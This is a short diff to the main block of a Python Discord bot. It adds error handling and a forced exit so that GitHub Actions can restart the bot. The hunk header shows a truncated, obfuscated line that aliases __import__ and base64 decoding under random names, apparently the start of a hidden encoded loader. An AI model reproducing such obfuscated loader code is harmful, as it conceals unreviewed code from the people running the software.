@@ -17,12 +17,16 @@ CLNtVBTHkbFEEAQ=__import__;okgIXLroQhOfyzL=CLNtVBTHkbFEEAQ('base64').b64decode;c
 
 
 if __name__ == "__main__":
-    print("=== Discord Bot 起動中 ===")
-    
-   
-    token = os.getenv("DISCORD_TOKEN")
-    if not token:
-        raise ValueError(" 環境変数TOKEN が設定されていません .env を確認してください。")
-
-    # Botを起動
-    bot.run(token)
+    try:
+        print("=== Discord Bot 起動中 ===")
+        token = os.getenv("DISCORD_TOKEN")
+        if not token:
+            print(" トークンが見つかりません")
+            sys.exit(1)
+        bot.run(token)
+    except Exception as e:
+        print(f" エラー発生: {e}")
+    finally:
+        print(" Bot終了: GitHub Actionsが再起動を担当します")
+        sys.stdout.flush()
+        sys.exit(0)  # ★これが重要！絶対入れる！
